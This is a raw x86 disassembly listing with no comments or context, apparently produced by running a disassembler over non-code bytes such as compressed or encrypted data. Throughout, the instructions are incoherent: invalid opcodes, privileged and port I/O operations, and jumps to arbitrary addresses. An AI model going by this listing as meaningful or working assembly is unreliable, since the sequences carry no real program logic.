  411122:	add    ch,BYTE PTR [ebx]
  411124:	sub    edx,DWORD PTR [ebp+0x2ecc05a5]
  41112a:	dec    esp
  41112b:	test   DWORD PTR [ebx+0x759755e8],edi
  411131:	push   0x13
  411133:	fs hlt 
  411135:	lods   eax,DWORD PTR ds:[esi]
  411136:	bound  ecx,QWORD PTR [edx+0x67d0074b]
  41113c:	add    al,0x46
  41113e:	push   edi
  41113f:	ins    DWORD PTR es:[edi],dx
  411140:	shr    bh,0x42
  411143:	adc    BYTE PTR es:[edi+0x1d150ece],0xf8
  41114b:	cmp    BYTE PTR [ebp+0x18f6ebba],cl
  411151:	dec    ebx
  411152:	add    edi,eax
  411154:	sub    DWORD PTR [eiz*4+0x31e7678a],ebp
  41115b:	test   eax,0xa4217f62
  411160:	adc    BYTE PTR [edi-0x65],cl
  411163:	jl     0x4111c9
  411165:	arpl   WORD PTR ds:0xe7656b0f,cx
  41116b:	push   edi
  41116c:	scas   eax,DWORD PTR es:[edi]
  41116d:	dec    eax
  41116e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411170:	pop    esp
  411171:	out    0xf8,eax
  411173:	enter  0xf605,0xe4
  411177:	jno    0x411156
  411179:	iret   
  41117a:	xlat   BYTE PTR ds:[ebx]
  41117b:	mov    ds:0x27dfef5,eax
  411180:	(bad)  [ebp-0x56]
  411183:	mov    al,0xb7
  411185:	fisubr WORD PTR [ebp+0x57]
  411188:	loope  0x411128
  41118a:	inc    edx
  41118b:	jb     0x4111e0
  41118d:	pusha  
  41118e:	adc    BYTE PTR [esi-0x19295594],dl
  411194:	mov    ah,0xad
  411196:	and    cl,dh
  411198:	mov    cl,0xf5
  41119a:	jb     0x4111e3
  41119c:	push   ecx
  41119d:	fsub   DWORD PTR [esi]
  41119f:	mov    ah,ah
  4111a1:	jnp    0x411125
  4111a3:	inc    eax
  4111a4:	pop    ecx
  4111a5:	mov    ah,0xf3
  4111a7:	ret    
  4111a8:	data16 jge 0x41115f
  4111ab:	pop    edi
  4111ac:	das    
  4111ad:	test   DWORD PTR [edx*1-0xf6dc555],edi
  4111b4:	in     al,dx
  4111b5:	ja     0x4111f1
  4111b7:	in     al,dx
  4111b8:	inc    ebp
  4111b9:	jmp    0xa6080bf6
  4111be:	int    0xe9
  4111c0:	cmp    al,0x2
  4111c2:	push   eax
  4111c3:	xchg   esi,eax
  4111c4:	shl    edi,1
  4111c6:	(bad)  
  4111c7:	imul   esi,DWORD PTR [eax+0x7d93ea86],0xffffff83
  4111ce:	scas   al,BYTE PTR es:[edi]
  4111cf:	pop    ecx
  4111d0:	xor    bl,bl
  4111d2:	dec    edi
  4111d3:	jmp    0x1652a258
  4111d8:	fisub  DWORD PTR [ecx+0x71]
  4111db:	adc    al,0x2f
  4111dd:	(bad)  
  4111de:	jle    0x4111f5
  4111e0:	fmul   DWORD PTR ds:0xb0c08099
  4111e6:	adc    BYTE PTR ds:0xf2503e17,cl
  4111ec:	std    
  4111ed:	call   0xb265:0x9af80427
  4111f4:	inc    edx
  4111f5:	fdiv   QWORD PTR [ebx+edx*4-0x6492bcea]
  4111fc:	popf   
  4111fd:	repnz stos BYTE PTR es:[edi],al
  4111ff:	test   ebx,ebp
  411201:	mov    cl,BYTE PTR [ebx+ebx*1]
  411204:	inc    ecx
  411205:	fiadd  DWORD PTR cs:[ebx+0x53]
  411209:	(bad)  
  41120a:	pop    ss
  41120b:	ret    
  41120c:	mov    esi,0xec5a4724
  411211:	mov    eax,0x1311499
  411216:	cli    
  411217:	retf   
  411218:	adc    DWORD PTR [esp+ecx*8],esi
  41121b:	rol    DWORD PTR [edi+0xe],cl
  41121e:	or     bh,ch
  411220:	cli    
  411221:	loopne 0x411261
  411223:	or     al,0xa8
  411225:	inc    DWORD PTR [ecx+0x4e]
  411228:	addr16 cmp ah,ch
  41122b:	add    eax,DWORD PTR [edx]
  41122d:	mov    ah,ah
  41122f:	std    
  411230:	daa    
  411231:	pop    ecx
  411232:	push   0x566e3ff8
  411237:	ja     0x4111ec
  411239:	mov    cl,0xd1
  41123b:	or     al,0xc9
  41123d:	(bad)  [esi]
  41123f:	mov    eax,0x739015a3
  411244:	cmp    dh,0x15
  411247:	movs   WORD PTR es:[edi],WORD PTR cs:[esi]
  41124a:	repnz jmp 0xcc5f:0x5c737693
  411252:	fidivr WORD PTR [edi]
  411254:	inc    ecx
  411255:	mov    al,0xc1
  411257:	mov    esi,0x75d01fd2
  41125c:	xchg   edx,eax
  41125d:	and    bh,BYTE PTR [edx-0x4]
  411260:	jmp    0x4112a6
  411262:	mov    DWORD PTR ds:0xfaf6490c,0x9652d85d
  41126c:	sbb    DWORD PTR [ecx+0x6d],edx
  41126f:	das    
  411270:	sbb    DWORD PTR [ecx-0x7c9b254e],eax
  411276:	shl    ah,0x9e
  411279:	repnz lea edx,[edx]
  41127c:	push   ds
  41127d:	enter  0x57b2,0xc
  411281:	sub    DWORD PTR ds:0xc95228df,esp
  411287:	adc    al,0xe1
  411289:	cmp    DWORD PTR [ebx-0x62e2d9a9],0x4949d221
  411293:	std    
  411294:	in     eax,0xd8
  411296:	sbb    al,0x5f
  411298:	inc    ebx
  411299:	jnp    0x411308
  41129b:	imul   esi,DWORD PTR [ebp-0x57],0xca848eab
  4112a2:	push   ebx
  4112a3:	or     esp,DWORD PTR [eax-0x7f0fb8ff]
  4112a9:	(bad)  
  4112aa:	adc    DWORD PTR [ecx],ebp
  4112ac:	pop    ss
  4112ad:	fwait
  4112ae:	mov    ecx,0x9e391fae
  4112b3:	sahf   
  4112b4:	fs daa 
  4112b6:	fidiv  DWORD PTR [ecx-0x61eb65f2]
  4112bc:	adc    ebx,ecx
  4112be:	dec    eax
  4112bf:	js     0x41125c
  4112c1:	xchg   DWORD PTR [edx],ebp
  4112c3:	loope  0x4112ef
  4112c5:	cmc    
  4112c6:	jmp    0x41124c
  4112c8:	cdq    
  4112c9:	aas    
  4112ca:	push   0xec18c033
  4112cf:	sahf   
  4112d0:	jmp    0x411286
  4112d2:	xor    eax,0x6900b8bc
  4112d7:	sbb    al,0x8f
  4112d9:	xchg   esi,eax
  4112da:	add    edi,ecx
  4112dc:	in     eax,dx
  4112dd:	lods   al,BYTE PTR ds:[esi]
  4112de:	ficomp WORD PTR [eax]
  4112e0:	inc    edi
  4112e1:	sahf   
  4112e2:	rol    DWORD PTR [eax],1
  4112e4:	js     0x411292
  4112e6:	scas   eax,DWORD PTR es:[edi]
  4112e7:	inc    edx
  4112e8:	push   edi
  4112e9:	add    cl,BYTE PTR [ebp+0x2e31ed0d]
  4112ef:	sahf   
  4112f0:	or     DWORD PTR [esi+ebx*1],0x67
  4112f4:	xchg   DWORD PTR [edx+0x21],ebx
  4112f7:	xchg   edi,eax
  4112f8:	std    
  4112f9:	dec    esi
  4112fa:	sbb    eax,0x765c9219
  4112ff:	cmp    ebx,edi
  411301:	or     al,0x19
  411303:	sbb    esi,DWORD PTR ds:0x787ace82
  411309:	add    eax,0x4ad1d5d4
  41130e:	mov    cl,cl
  411310:	jl     0x411314
  411312:	push   cs
  411313:	test   dh,0xdf
  411316:	retf   
  411317:	sbb    ah,BYTE PTR [edx+0x13]
  41131a:	fstp   QWORD PTR [ebp-0x49]
  41131d:	jl     0x4112ce
  41131f:	rcr    cl,1
  411321:	sar    eax,cl
  411323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411324:	jecxz  0x411305
  411326:	aad    0x8
  411328:	retf   
  411329:	imul   edx,edx,0x815943bd
  41132f:	cmp    eax,0x2feb4c8c
  411334:	cld    
  411335:	retf   
  411336:	icebp  
  411337:	inc    esp
  411338:	jae    0x41137a
  41133a:	mov    al,ds:0xbd9139d3
  41133f:	xchg   edi,eax
  411340:	daa    
  411341:	inc    ecx
  411342:	fsubr  DWORD PTR [ebx+eax*8+0x7f]
  411346:	inc    esp
  411347:	dec    eax
  411348:	int3   
  411349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134a:	mov    ebx,0x85e03fd8
  41134f:	dec    edi
  411350:	mov    ecx,0xecb26101
  411355:	cli    
  411356:	scas   eax,DWORD PTR es:[edi]
  411357:	sbb    eax,0x446a1bb3
  41135c:	iret   
  41135d:	(bad)  
  41135e:	cld    
  41135f:	rcl    DWORD PTR ds:0x5d89157c,1
  411365:	dec    edx
  411366:	inc    edi
  411367:	adc    esp,DWORD PTR [eax+edi*4+0x2b]
  41136b:	addr16 push esp
  41136d:	jge    0x411391
  41136f:	int    0x84
  411371:	(bad)  
  411372:	popa   
  411373:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411375:	or     al,0x7b
  411377:	mov    fs,WORD PTR [ecx]
  411379:	xchg   ecx,eax
  41137a:	add    ecx,DWORD PTR [esi*4-0x22a74fb1]
  411381:	jnp    0x41136f
  411383:	outs   dx,BYTE PTR ds:[esi]
  411384:	in     al,dx
  411385:	(bad)  
  411386:	pop    esp
  411387:	lds    ebx,FWORD PTR [ecx]
  411389:	push   0x6e1a55f2
  41138e:	cs or  ah,al
  411391:	(bad)  
  411392:	in     al,0x6b
  411394:	dec    esp
  411395:	mov    ebp,0x5541f2a5
  41139a:	cwde   
  41139b:	add    ecx,DWORD PTR [ecx-0x6f]
  41139e:	aam    0xf2
  4113a0:	scas   al,BYTE PTR es:[edi]
  4113a1:	(bad)  
  4113a2:	xchg   edi,eax
  4113a3:	cli    
  4113a4:	les    edi,FWORD PTR [esi+edx*8-0x7f8cf210]
  4113ab:	std    
  4113ac:	aad    0x69
  4113ae:	in     eax,0x87
  4113b0:	test   eax,0x82bdac94
  4113b5:	mov    ebx,0x76819565
  4113ba:	shl    BYTE PTR [ecx-0x5c96b6b],cl
  4113c0:	out    0x60,al
  4113c2:	cmp    DWORD PTR [edx+0x25],eax
  4113c5:	mov    ebp,0x56af076c
  4113ca:	push   esp
  4113cb:	out    0xb3,eax
  4113cd:	pusha  
  4113ce:	pop    ebx
  4113cf:	int    0x2
  4113d1:	jbe    0x41142a
  4113d3:	aad    0x7
  4113d5:	rol    DWORD PTR [esi],0x8d
  4113d8:	loope  0x41144e
  4113da:	push   esp
  4113db:	cmc    
  4113dc:	ins    BYTE PTR es:[edi],dx
  4113dd:	test   BYTE PTR [esi+0x4f],dl
  4113e0:	fisub  DWORD PTR [ecx+ebx*1]
  4113e3:	push   esp
  4113e4:	push   ebx
  4113e5:	dec    esi
  4113e6:	pop    edx
  4113e7:	outs   dx,DWORD PTR ds:[esi]
  4113e8:	shr    BYTE PTR [ecx-0x47],cl
  4113eb:	inc    eax
  4113ec:	fwait
  4113ed:	jbe    0x41142f
  4113ef:	rcr    ebp,0xfc
  4113f2:	dec    ebp
  4113f3:	mov    cl,0x4
  4113f5:	xchg   ebx,eax
  4113f6:	ret    
  4113f7:	mov    ecx,0xab512f9e
  4113fc:	pop    ss
  4113fd:	jp     0x411423
  4113ff:	das    
  411400:	nop
  411401:	add    DWORD PTR [ecx+0x40],edx
  411404:	cli    
  411405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411406:	mov    di,0xaee4
  41140a:	enter  0xa081,0x18
  41140e:	popf   
  41140f:	pop    edx
  411410:	lock pushf 
  411412:	xchg   esp,eax
  411413:	gs mov bh,0xbc
  411416:	scas   al,BYTE PTR es:[edi]
  411417:	sbb    eax,0x463f02d3
  41141c:	mov    eax,0xa6965389
  411421:	cmc    
  411422:	sbb    bh,bl
  411424:	dec    ebp
  411425:	je     0x41142a
  411427:	sub    ch,ch
  411429:	in     eax,0x61
  41142b:	jne    0x411423
  41142d:	out    dx,al
  41142e:	test   DWORD PTR [edx+edi*1-0x2789af50],0xfe185d37
  411439:	mov    ch,0x45
  41143b:	push   ss
  41143c:	add    cl,bh
  41143e:	repnz inc ebp
  411440:	xor    ch,BYTE PTR [di-0x7600]
  411445:	fisubr WORD PTR [ebx+0x19]
  411448:	push   esi
  411449:	cmp    cl,0xc2
  41144c:	rcr    BYTE PTR [esi+0x139e53c2],0x8e
  411453:	cmp    BYTE PTR [esi-0x5d],bl
  411456:	jmp    0xa36b:0xcaeabbea
  41145d:	scas   al,BYTE PTR es:[edi]
  41145e:	mov    esi,0xba5d61c4
  411463:	and    BYTE PTR [edx-0x44c31c58],bh
  411469:	repnz inc esp
  41146b:	mov    ch,0x76
  41146d:	add    al,0xd3
  41146f:	enter  0x4746,0xdf
  411473:	pop    edx
  411474:	not    BYTE PTR [eax+edi*8]
  411477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411478:	(bad)
  41147c:	ja     0x4114e9
  41147e:	out    0xa1,eax
  411480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411481:	xor    dl,BYTE PTR [ecx+0x28]
  411484:	pusha  
  411485:	add    ebx,edi
  411487:	add    ebp,0xbb8e9a3f
  41148d:	fld    DWORD PTR [edi+0x4c]
  411490:	cli    
  411491:	jge    0x411496
  411493:	jo     0x4114a9
  411495:	leave  
  411496:	sbb    DWORD PTR [ecx+0x5a342c9b],edi
  41149c:	(bad)  
  41149d:	adc    al,0xf1
  41149f:	xchg   esi,eax
  4114a0:	mov    esp,0xb7e890ba
  4114a5:	jecxz  0x4114eb
  4114a7:	inc    edx
  4114a8:	addr16 adc al,0xe8
  4114ab:	std    
  4114ac:	push   ds
  4114ad:	into   
  4114ae:	cmp    BYTE PTR [ebx],0x8c
  4114b1:	adc    eax,0xd3c2a34f
  4114b6:	mov    eax,0xe30085ce
  4114bb:	imul   edx,ebx,0x443a6579
  4114c1:	cmp    edx,DWORD PTR [edx]
  4114c3:	dec    esi
  4114c4:	imul   esp,ebx,0x43
  4114c7:	push   0x62530a88
  4114cc:	jg     0x411521
  4114ce:	cmp    DWORD PTR [esi+0x49e92ec3],edi
  4114d4:	sbb    dh,ch
  4114d6:	or     DWORD PTR [edi+eiz*4-0x74],0xffffffd5
  4114db:	sbb    DWORD PTR [edx+0x5a1fc11e],ecx
  4114e1:	dec    ecx
  4114e2:	pushf  
  4114e3:	xchg   esi,eax
  4114e4:	adc    eax,0xaa962aa3
  4114e9:	mov    eax,ds:0x61187d87
  4114ee:	test   DWORD PTR [edi],edx
  4114f0:	mov    bl,0x47
  4114f2:	xchg   esp,eax
  4114f3:	adc    DWORD PTR [esi],esp
  4114f5:	out    dx,eax
  4114f6:	push   esi
  4114f7:	arpl   WORD PTR ds:0x334335ad,sp
  4114fd:	call   0x4ecf01f5
  411502:	dec    edi
  411503:	push   ds
  411504:	pop    eax
  411505:	popf   
  411506:	mov    esp,0x39bcd2e5
  41150b:	sahf   
  41150c:	cld    
  41150d:	mov    eax,0xe02232ac
  411512:	mov    ch,0xb2
  411514:	add    dh,BYTE PTR [ebp+0x63]
  411517:	out    0xa3,eax
  411519:	mov    BYTE PTR [eax],al
  41151b:	inc    DWORD PTR [eax+0x52]
  41151e:	popa   
  41151f:	enter  0xe481,0xd2
  411523:	xchg   esp,eax
  411524:	dec    esp
  411525:	mov    ecx,0x71657a58
  41152a:	mov    ch,0x7f
  41152c:	scas   eax,DWORD PTR es:[edi]
  41152d:	or     BYTE PTR [esi+0x16],al
  411530:	add    BYTE PTR [eax],0xc0
  411533:	cdq    
  411534:	adc    eax,0xf6280cf6
  411539:	les    edi,FWORD PTR [ebx-0x3b9bcd44]
  41153f:	adc    DWORD PTR [edx+edx*4+0x66],0xc775d0f1
  411547:	jns    0x41159f
  411549:	sub    DWORD PTR ds:0x254c65cb,eax
  41154f:	les    eax,FWORD PTR [eax]
  411551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411552:	neg    ch
  411554:	loope  0x41153e
  411556:	das    
  411557:	mov    eax,ds:0x4822827a
  41155c:	cmp    eax,0xa1aca35
  411561:	pop    esi
  411562:	push   esi
  411563:	outs   dx,BYTE PTR ds:[esi]
  411564:	fwait
  411565:	xchg   BYTE PTR [edx-0x3],dl
  411568:	pop    ebx
  411569:	call   0x74a5:0x46976f76
  411570:	push   ss
  411571:	loopne 0x4115a1
  411573:	xor    dh,BYTE PTR [ecx+edi*8-0x71]
  411577:	add    esp,DWORD PTR [edi-0x118db039]
  41157d:	or     al,0xd0
  41157f:	add    cl,BYTE PTR [ebp+0x1c7e469d]
  411585:	lods   al,BYTE PTR ds:[esi]
  411586:	pop    ds
  411587:	into   
  411588:	adc    ecx,DWORD PTR [eax]
  41158a:	sub    al,BYTE PTR [edx]
  41158c:	mov    edx,0x5d62b15f
  411591:	out    0x8e,eax
  411593:	loopne 0x41159e
  411595:	or     dl,bl
  411597:	adc    ah,BYTE PTR [ebp+0x4e]
  41159a:	mov    cl,0x84
  41159c:	out    dx,al
  41159d:	lahf   
  41159e:	sub    cl,BYTE PTR [ebx-0x63]
  4115a1:	imul   esp,eax,0x47
  4115a4:	adc    BYTE PTR ds:0x6e2c3b7,ch
  4115aa:	lods   al,BYTE PTR ds:[esi]
  4115ab:	adc    al,BYTE PTR [eax-0x3ca3bdf1]
  4115b1:	inc    ecx
  4115b2:	loopne 0x41160f
  4115b4:	popf   
  4115b5:	mov    esp,0x3ac84687
  4115ba:	cmp    edx,esp
  4115bc:	mov    WORD PTR [edx+0x6b1e3418],cs
  4115c2:	pop    ebp
  4115c3:	stos   BYTE PTR es:[edi],al
  4115c4:	jge    0x411559
  4115c6:	jg     0x4115b9
  4115c8:	mul    BYTE PTR [eax-0x7399c8ca]
  4115ce:	out    0x19,eax
  4115d0:	(bad)  
  4115d2:	pop    eax
  4115d3:	pop    ecx
  4115d4:	(bad)
  4115d7:	fwait
  4115d8:	cmp    DWORD PTR [esi-0x32],eax
  4115db:	aad    0xdb
  4115dd:	test   BYTE PTR [ecx],0x57
  4115e0:	and    al,0x6d
  4115e2:	mov    dl,0xff
  4115e4:	retf   
  4115e5:	mov    edi,DWORD PTR [edi+esi*1]
  4115e8:	and    ecx,ebp
  4115ea:	mov    BYTE PTR [edi+ebx*8-0x3ef556d2],bl
  4115f1:	sbb    ah,al
  4115f3:	fstp   TBYTE PTR [eax-0x42]
  4115f6:	mov    esi,0x97cebbf2
  4115fb:	jae    0x4115e1
  4115fd:	jge    0x411587
  4115ff:	lods   eax,DWORD PTR ds:[esi]
  411600:	ds xor eax,0xef3f715b
  411606:	xor    al,0xb7
  411608:	aas    
  411609:	rcr    BYTE PTR [esi-0x7f],0x39
  41160d:	sub    eax,0xf6a9b3b7
  411612:	and    ebp,DWORD PTR [edi+0x7b]
  411615:	rcr    BYTE PTR [ecx-0x6c],1
  411618:	or     eax,0x189ad50e
  41161d:	jns    0x411651
  41161f:	ret    
  411620:	and    ebx,DWORD PTR [edx+0x34]
  411623:	ds scas eax,DWORD PTR es:[edi]
  411625:	int3   
  411626:	jecxz  0x411683
  411628:	sbb    bh,dh
  41162a:	mov    DWORD PTR [esi-0x2c95a5b7],0x903b1717
  411634:	add    eax,0x30f09b04
  411639:	mov    esi,0xa219f242
  41163e:	add    BYTE PTR [ecx],ch
  411640:	push   ss
  411641:	in     eax,0x9b
  411643:	test   eax,0x897ce47f
  411648:	cdq    
  411649:	dec    eax
  41164a:	das    
  41164b:	dec    eax
  41164c:	push   ds
  41164d:	hlt    
  41164e:	in     eax,dx
  41164f:	fcmovnb st,st(2)
  411651:	add    edi,DWORD PTR [ebx-0x5fdbf839]
  411657:	dec    ecx
  411658:	mov    eax,ds:0x75579299
  41165d:	or     al,0xc8
  41165f:	inc    ecx
  411660:	pop    eax
  411661:	pop    ebp
  411662:	jg     0x41162f
  411664:	in     al,dx
  411665:	pop    ebp
  411666:	mov    ah,0x90
  411668:	cmp    eax,0xa211bac4
  41166d:	out    dx,eax
  41166e:	adc    bl,BYTE PTR [esi+0x108ce08f]
  411674:	shl    DWORD PTR [ebx],0xcb
  411677:	neg    DWORD PTR [edx-0x6c]
  41167a:	jmp    esp
  41167c:	and    BYTE PTR [edi-0x2f88e01b],ch
  411682:	jl     0x4116e7
  411684:	xor    al,0x28
  411686:	shr    DWORD PTR [esi-0x1b79dd54],cl
  41168c:	cmp    BYTE PTR [edx+ecx*2-0x493fa8ba],0x76
  411694:	sahf   
  411695:	mov    al,ds:0x57290c73
  41169a:	xor    eax,0xedcd63d1
  41169f:	lds    esp,FWORD PTR [ecx]
  4116a1:	fbld   TBYTE PTR ds:0xf2d77d12
  4116a7:	sbb    BYTE PTR [esi],bl
  4116a9:	mov    ch,0xd5
  4116ab:	test   eax,0xaaf9721f
  4116b0:	out    dx,al
  4116b1:	daa    
  4116b2:	cmp    DWORD PTR [edx+0x5],ecx
  4116b5:	aam    0x94
  4116b7:	leave  
  4116b8:	push   ecx
  4116b9:	adc    DWORD PTR [ecx],ebp
  4116bb:	push   esp
  4116bc:	fstp   DWORD PTR [eax+0x12]
  4116bf:	dec    eax
  4116c0:	mov    DWORD PTR [ebp-0x3dde73a5],esp
  4116c6:	push   esp
  4116c7:	test   BYTE PTR [ebx-0x7bc12b0a],ch
  4116cd:	xchg   esp,eax
  4116ce:	pop    ebx
  4116cf:	call   0x28fe:0x46f2b8b1
  4116d6:	shl    BYTE PTR [edi],0x92
  4116d9:	inc    ecx
  4116da:	syscall 
  4116dc:	int    0x67
  4116de:	push   ds
  4116df:	cmp    al,0x44
  4116e1:	imul   ecx,DWORD PTR [eax-0x4d],0x4c951465
  4116e8:	loopne 0x411758
  4116ea:	dec    esp
  4116eb:	(bad)  
  4116ec:	jb     0x4116ee
  4116ee:	sbb    bl,dl
  4116f0:	div    dh
  4116f2:	mov    ds:0x6840e457,eax
  4116f7:	jl     0x41174c
  4116f9:	add    ebp,edx
  4116fb:	adc    eax,0xb3470420
  411700:	push   eax
  411701:	pop    eax
  411703:	mov    esi,0xc6f20553
  411708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411709:	das    
  41170a:	dec    ecx
  41170b:	in     eax,0x63
  41170d:	scas   al,BYTE PTR es:[edi]
  41170e:	pop    esi
  41170f:	add    esp,DWORD PTR [edi-0x16]
  411712:	call   0xdaf78d97
  411717:	xor    esi,eax
  411719:	or     al,0x7c
  41171b:	bound  edx,QWORD PTR [ecx]
  41171d:	fwait
  41171e:	dec    ebp
  41171f:	jp     0x41171a
  411721:	ds gs inc edx
  411724:	sbb    DWORD PTR [ecx],edx
  411726:	sbb    eax,0xa56fc2f9
  41172b:	test   eax,edx
  41172d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41172e:	mov    edx,0x54eda64e
  411733:	dec    ebx
  411734:	mov    fs,WORD PTR [eax]
  411736:	xor    BYTE PTR [ebp+0x13],al
  411739:	ror    DWORD PTR [edi-0x286cb111],1
  41173f:	adc    al,0x5b
  411741:	xchg   edi,eax
  411742:	js     0x411794
  411744:	sbb    dh,BYTE PTR [ecx+0x2c14a232]
  41174a:	xchg   esi,eax
  41174b:	out    dx,eax
  41174c:	scas   al,BYTE PTR es:[edi]
  41174d:	fwait
  41174e:	sahf   
  41174f:	xor    eax,DWORD PTR ds:0x69f0c4e6
  411755:	xchg   esp,eax
  411756:	pop    ds
  411757:	mov    dl,0x44
  411759:	test   al,0xac
  41175b:	dec    esi
  41175c:	std    
  41175d:	repz sahf 
  41175f:	pop    es
  411760:	test   al,0x12
  411762:	bound  esp,QWORD PTR [edi-0x5b]
  411765:	lods   al,BYTE PTR ds:[esi]
  411766:	mov    eax,ds:0xe72d1bb9
  41176b:	push   es
  41176c:	add    DWORD PTR [edi],0xca25f34c
  411772:	popa   
  411773:	mov    eax,0x4739f74e
  411778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411779:	ror    cl,0x15
  41177c:	inc    ebp
  41177d:	arpl   WORD PTR [ebx],cx
  41177f:	lahf   
  411780:	inc    eax
  411781:	add    al,0xa7
  411783:	inc    edi
  411784:	imul   edi,DWORD PTR [esi-0x17c890d1],0x398088df
  41178e:	mov    bh,0x9b
  411790:	stc    
  411791:	push   0xffffff86
  411793:	lods   al,BYTE PTR ds:[esi]
  411794:	jle    0x411728
  411796:	mov    ch,0xb2
  411798:	cld    
  411799:	iret   
  41179a:	mov    bh,0x7d
  41179c:	repnz push eax
  41179e:	jmp    0x411767
  4117a0:	stc    
  4117a1:	add    BYTE PTR [eax+eax*8-0x17],ch
  4117a5:	(bad)  
  4117a6:	jno    0x411801
  4117a8:	shl    BYTE PTR [esi],0xa9
  4117ab:	aas    
  4117ac:	inc    edx
  4117ad:	mov    al,ds:0x5b0b02ef
  4117b2:	mov    esp,0x63d93147
  4117b7:	lds    ebp,FWORD PTR [ebp+0x35]
  4117ba:	dec    edi
  4117bb:	jl     0x41175b
  4117bd:	repnz imul ebx,DWORD PTR [edi],0x5afaeab3
  4117c4:	shl    BYTE PTR [ebp-0x1cf51514],cl
  4117ca:	aas    
  4117cb:	imul   ebp,DWORD PTR [esi+0x7d],0x6d
  4117cf:	mov    ?,WORD PTR cs:[edx+0x9728c9c]
  4117d6:	or     esi,DWORD PTR [ebp-0x8]
  4117d9:	mov    WORD PTR [ecx-0x39ed5fb7],fs
  4117df:	pushf  
  4117e0:	sahf   
  4117e1:	test   eax,0xaa141c35
  4117e6:	pushf  
  4117e7:	or     ch,ah
  4117e9:	xchg   ebx,eax
  4117ea:	movzx  ebx,WORD PTR [esi]
  4117ed:	leave  
  4117ee:	imul   esi,DWORD PTR [ecx],0x6a
  4117f1:	push   edi
  4117f2:	inc    edi
  4117f3:	mov    dh,0xc6
  4117f5:	jb     0x411876
  4117f7:	stc    
  4117f8:	int3   
  4117f9:	jmp    0x4117e1
  4117fb:	es adc edx,ebp
  4117fe:	push   0x9b35a616
  411803:	les    ebx,FWORD PTR [edi]
  411805:	fdiv   DWORD PTR [edi]
  411807:	push   edi
  411808:	in     eax,0x86
  41180a:	ja     0x4117e8
  41180c:	aam    0xb9
  41180e:	dec    ecx
  41180f:	inc    edx
  411810:	mov    dh,0x31
  411812:	sub    DWORD PTR [ebp-0x2fa51003],0x561fe35c
  41181c:	mov    ebx,0x267b56df
  411821:	xchg   BYTE PTR [ebp+0x2471e1db],cl
  411827:	and    dl,BYTE PTR [ecx+0x75]
  41182a:	and    DWORD PTR [esi],esp
  41182c:	clc    
  41182d:	mov    ah,0xa5
  41182f:	pop    eax
  411830:	push   es
  411831:	fs retf 
  411833:	popf   
  411834:	push   es
  411835:	jmp    FWORD PTR [esi+0x63]
  411838:	lods   al,BYTE PTR ds:[esi]
  411839:	xchg   esi,eax
  41183a:	call   DWORD PTR [edx-0x30cfdec6]
  411840:	push   esi
  411841:	xor    dh,BYTE PTR [ebx-0x3d50cebc]
  411847:	out    dx,al
  411848:	mov    WORD PTR [esi-0x6e],?
  41184b:	sub    eax,0xf8672f3d
  411850:	cdq    
  411851:	lahf   
  411852:	add    BYTE PTR [ebx],bh
  411854:	and    ch,BYTE PTR [ecx+0x529d1715]
  41185a:	sub    al,0x80
  41185c:	aam    0x41
  41185e:	pop    esp
  41185f:	xchg   esi,eax
  411860:	sub    DWORD PTR [esi+ebx*4+0x6c109334],edx
  411867:	scas   al,BYTE PTR es:[edi]
  411868:	and    DWORD PTR [edx-0x155d43d],0xc7060291
  411872:	mov    esp,0xa334b4ee
  411877:	cmp    DWORD PTR [esp],0xfcf3892
  41187e:	and    ah,BYTE PTR [edi+0x6cbf0a16]
  411884:	push   0x3f14ce2
  411889:	and    ch,bl
  41188b:	inc    ebx
  41188c:	arpl   WORD PTR [esi],di
  41188e:	out    0xdc,al
  411890:	push   0xcdaf4f36
  411895:	stos   DWORD PTR es:[edi],eax
  411896:	leave  
  411897:	fcomp  DWORD PTR [ebp+0x349d6844]
  41189d:	stos   DWORD PTR es:[edi],eax
  41189e:	sub    cl,bl
  4118a0:	xor    eax,0xb2ec463c
  4118a5:	test   ebx,ecx
  4118a7:	xor    BYTE PTR [esi],bl
  4118a9:	es (bad) 
  4118ac:	push   edi
  4118ad:	mov    eax,ds:0x3dccd8c3
  4118b2:	dec    esi
  4118b3:	in     eax,dx
  4118b4:	in     al,0xf0
  4118b6:	adc    DWORD PTR [edi-0x30864eda],ebp
  4118bc:	(bad)  
  4118bd:	cld    
  4118be:	(bad)  
  4118c0:	test   al,0x40
  4118c2:	xor    bl,al
  4118c4:	and    DWORD PTR [ebp+0x208106d5],0xa8e2cb89
  4118ce:	fild   DWORD PTR [edi]
  4118d0:	or     ch,dl
  4118d2:	iret   
  4118d3:	(bad)  
  4118d4:	jnp    0x411918
  4118d6:	jp     0x41190f
  4118d8:	sbb    cl,BYTE PTR [eax-0xd0395cc]
  4118de:	sub    DWORD PTR [eax+ecx*2+0x24424241],ecx
  4118e5:	aaa    
  4118e6:	or     bh,BYTE PTR [ecx+0x15d0a45b]
  4118ec:	mov    dl,BYTE PTR [ecx-0x35b8d4a0]
  4118f2:	ins    DWORD PTR es:[edi],dx
  4118f3:	aas    
  4118f4:	call   FWORD PTR [ebx]
  4118f6:	jle    0x4118cb
  4118f8:	into   
  4118f9:	pop    es
  4118fa:	inc    ebx
  4118fb:	xchg   esp,eax
  4118fc:	cli    
  4118fd:	cmc    
  4118fe:	xor    eax,0xec0d91d
  411903:	fsubp  st(5),st
  411905:	sbb    eax,0x7a1f62c9
  41190a:	test   eax,0xe708ce40
  41190f:	mov    WORD PTR [eax],es
  411911:	repz inc edi
  411913:	hlt    
  411914:	push   edi
  411915:	and    eax,0x93066127
  41191a:	ja     0x4118ef
  41191c:	adc    BYTE PTR [ecx-0x11],ah
  41191f:	push   esi
  411920:	das    
  411921:	jnp    0x411936
  411923:	ficomp WORD PTR [edx]
  411925:	or     DWORD PTR [esi+0x55609b97],0xfffffffd
  41192c:	or     bh,bh
  41192e:	ss or  al,0xb1
  411931:	ret    0x915d
  411934:	cmp    ebp,DWORD PTR [ecx]
  411936:	adc    al,BYTE PTR [edi]
  411938:	jnp    0x411963
